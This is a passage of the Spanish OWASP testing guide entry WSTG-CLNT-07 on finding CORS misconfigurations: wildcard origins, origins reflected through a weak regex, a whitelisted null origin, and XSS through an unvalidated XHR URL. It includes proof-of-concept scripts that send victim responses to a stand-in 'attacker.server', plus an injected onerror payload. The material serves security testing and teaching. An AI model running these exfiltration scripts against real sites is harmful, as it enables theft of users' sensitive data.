Cross Origin Resource Sharing (CORS)

ID
WSTG-CLNT-07

Resumen

Cross Origin Resource Sharing (CORS) es un mecanismo que permite a un navegador web realizar peticiones entre dominios (cross-domain) de manera controlada utilizando la API XMLHttpRequest (XHR) Nivel 2 (L2). En el pasado, la API XHR L1 solo permitía enviar peticiones dentro del mismo origen, ya que estaba restringida por la Same Origin Policy (SOP).

Las peticiones de origen cruzado (cross-origin) tienen una cabecera Origin que identifica el dominio que inicia la petición y que siempre se envía al servidor. CORS define el protocolo que se debe usar entre un navegador web y un servidor para determinar si se permite una petición de origen cruzado. Para ello se utilizan cabeceras HTTP.

El WHATWG Fetch Living Standard (CORS Protocol) (que sustituye a la especificación CORS del W3C, ya retirada) establece que, para las peticiones no simples, como las que usan métodos distintos de GET o POST o las que utilizan credenciales, se debe enviar de antemano una petición OPTIONS previa (pre-flight) para comprobar si el tipo de petición tendrá un impacto negativo sobre los datos. La petición previa verifica los métodos y cabeceras permitidos por el servidor, y si se permiten credenciales. Según el resultado de la petición OPTIONS, el navegador decide si la petición está permitida o no.

Origin y Access-Control-Allow-Origin

La cabecera de petición Origin siempre es enviada por el navegador en una petición CORS e indica el origen de la petición. La cabecera Origin no puede modificarse desde JavaScript, ya que el navegador (el user-agent) bloquea su modificación; sin embargo, apoyarse en esta cabecera para las comprobaciones de control de acceso no es una buena idea, porque puede falsificarse fuera del navegador, por ejemplo mediante un proxy, por lo que aún es necesario comprobar que se utilizan protocolos a nivel de aplicación para proteger los datos sensibles.

Access-Control-Allow-Origin es una cabecera de respuesta que utiliza un servidor para indicar qué dominios pueden leer la respuesta. Según la especificación CORS, corresponde al cliente determinar y hacer cumplir la restricción de si tiene acceso a los datos de la respuesta con base en esta cabecera.

Desde la perspectiva de las pruebas de seguridad, se deben buscar configuraciones inseguras, como por ejemplo usar un comodín * como valor de la cabecera Access-Control-Allow-Origin, lo que significa que se permiten todos los dominios. Otro ejemplo inseguro es cuando el servidor devuelve la cabecera origin sin ninguna comprobación adicional, lo que puede conducir al acceso a datos sensibles. Esta configuración que permite peticiones de origen cruzado es muy insegura y no es aceptable en términos generales, excepto en el caso de una API pública destinada a ser accesible por todos.

Access-Control-Request-Method y Access-Control-Allow-Method

La cabecera Access-Control-Request-Method se utiliza cuando un navegador realiza una petición OPTIONS previa y permite al cliente indicar el método de la petición final. Por otro lado, Access-Control-Allow-Method es una cabecera de respuesta que utiliza el servidor para describir los métodos que los clientes pueden usar.

Access-Control-Request-Headers y Access-Control-Allow-Headers

Estas dos cabeceras se utilizan entre el navegador y el servidor para determinar qué cabeceras se pueden usar para realizar una petición de origen cruzado.

Access-Control-Allow-Credentials

Esta cabecera de respuesta permite a los navegadores leer la respuesta cuando se pasan credenciales. Cuando se envía la cabecera, la aplicación web debe establecer un origen como valor de la cabecera Access-Control-Allow-Origin. La cabecera Access-Control-Allow-Credentials no puede utilizarse junto con la cabecera Access-Control-Allow-Origin cuyo valor sea el comodín *, como en el siguiente caso:

Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

Validación de entrada

XHR L2 introduce la posibilidad de crear una petición entre dominios utilizando la API XHR por compatibilidad con versiones anteriores. Esto puede introducir vulnerabilidades de seguridad que no estaban presentes en XHR L1. Puntos interesantes del código para explotar serían las URLs que se pasan a XMLHttpRequest sin validación, especialmente si se permiten URLs absolutas, porque eso podría conducir a inyección de código. Del mismo modo, otra parte de la aplicación que puede explotarse es aquella en la que los datos de la respuesta no se escapan y podemos controlarlos proporcionando entrada del usuario.

Otras cabeceras

Hay otras cabeceras involucradas, como Access-Control-Max-Age, que determina el tiempo durante el cual una petición previa puede almacenarse en caché en el navegador, o Access-Control-Expose-Headers, que indica qué cabeceras es seguro exponer a la API de una especificación de API CORS.

Para revisar las cabeceras CORS, consulte el documento CORS de MDN.

Objetivos de la prueba

  • Identificar los endpoints que implementan CORS.
  • Asegurar que la configuración de CORS sea segura o inofensiva.

Cómo probar

Una herramienta como ZAP puede permitir a los evaluadores interceptar cabeceras HTTP, lo que puede revelar cómo se utiliza CORS. Los evaluadores deben prestar especial atención a la cabecera origin para saber qué dominios están permitidos. Además, en algunos casos es necesaria la inspección manual del JavaScript para determinar si el código es vulnerable a la inyección de código debido a un manejo inadecuado de la entrada proporcionada por el usuario.

Configuración errónea de CORS

Establecer el comodín en la cabecera Access-Control-Allow-Origin (es decir, Access-Control-Allow-Origin: *) no es seguro si la respuesta contiene información sensible. Aunque no puede usarse al mismo tiempo con Access-Control-Allow-Credentials: true, puede ser peligroso cuando el control de acceso se realiza únicamente mediante reglas de firewall o las direcciones IP de origen, en lugar de estar protegido por credenciales.

Access-Control-Allow-Origin con comodín

Un evaluador puede comprobar si Access-Control-Allow-Origin: * existe en los mensajes de respuesta HTTP.

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[Response Body]

Si una respuesta contiene datos sensibles, un atacante puede robarlos mediante el uso de XHR:

<html>
    <head></head>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var xhr2 = new XMLHttpRequest();
                    // attacker.server: attacker listener to steal response
                    xhr2.open("POST", "https://attacker.server", true);
                    xhr2.send(xhr.responseText);
                }
            };
            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header 
            xhr.open("GET", "https://victim.site", true);
            xhr.send();
        </script>
    </body>
</html>

Política CORS dinámica

Una aplicación web o API moderna puede estar implementada para permitir peticiones de origen cruzado de forma dinámica, generalmente para permitir las peticiones provenientes de subdominios, como en el siguiente caso:

if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
   header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
   ...
}

En este ejemplo, se permitirán todas las peticiones de los subdominios de example.com. Hay que asegurarse de que la expresión regular utilizada para la coincidencia sea completa. De lo contrario, si simplemente se comparara con example.com (sin añadir $), los atacantes podrían eludir la política CORS añadiendo su dominio a la cabecera Origin.

GET /test.php HTTP/1.1
Host: example.com
[...]
Origin: https://example.com.attacker.com
Cookie: <session cookie>

Cuando se envía la petición anterior, si se devuelve la siguiente respuesta con Access-Control-Allow-Origin cuyo valor es el mismo que la entrada del atacante, este puede leer la respuesta posteriormente y acceder a información sensible que solo es accesible para un usuario víctima.

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: https://example.com.attacker.com
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

[Response Body]

Valor de origen null en la lista de permitidos

La cabecera Origin puede tener el valor null en situaciones específicas, como las peticiones desencadenadas desde un archivo local, una redirección o un objeto serializado. A veces los desarrolladores incluyen el origen null en la lista de permitidos para facilitar el desarrollo local o para dar soporte a clientes que no son web.

Sin embargo, el origen null actúa como un "comodín" que puede explotarse. Un atacante puede generar programáticamente una petición con el origen null mediante un iframe en modo sandbox.

Si el servidor simplemente refleja el origen null en las cabeceras de respuesta, especialmente con credenciales permitidas, se crea una vulnerabilidad similar a la del comodín genérico.

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

En un escenario de explotación, un atacante incrusta un iframe con sandbox en su sitio malicioso. El atributo sandbox obliga al navegador a establecer el Origin de las peticiones iniciadas desde dentro de ese frame como null.

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
    <script>
        fetch('https://victim.site/sensitive-data', {
            method: 'GET',
            credentials: 'include' // Essential for sending cookies/auth headers
        })
        .then(response => response.text())
        .then(data => {
            // Exfiltrate data to attacker's server
            location.href = 'https://attacker.server/log?data=' + btoa(data);
        });
    </script>">
</iframe>

En consecuencia, el navegador ve que la petición proviene de null, el servidor permite null y el atacante lee con éxito la respuesta sensible.

Debilidad en la validación de entrada

El concepto de CORS puede verse desde un ángulo completamente distinto. Un atacante puede permitir su política CORS a propósito para inyectar código en la aplicación web objetivo.

XSS remoto con CORS

Este código realiza una petición al recurso pasado después del carácter # en la URL, utilizado inicialmente para obtener recursos en el mismo servidor.

Código vulnerable:

<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>

Por ejemplo, una petición como esta mostrará el contenido del archivo profile.php:

https://example.foo/main.php#profile.php

Petición y respuesta generadas por https://example.foo/profile.php:

GET /profile.php HTTP/1.1
Host: example.foo
[...]
Referer: https://example.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[Response Body]

Ahora, como no hay validación de la URL, podemos inyectar un script remoto, que se inyectará y ejecutará en el contexto del dominio example.foo, con una URL como esta:

https://example.foo/main.php#https://attacker.bar/file.php

Petición y respuesta generadas por https://attacker.bar/file.php:

GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: https://example.foo/main.php
origin: https://example.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
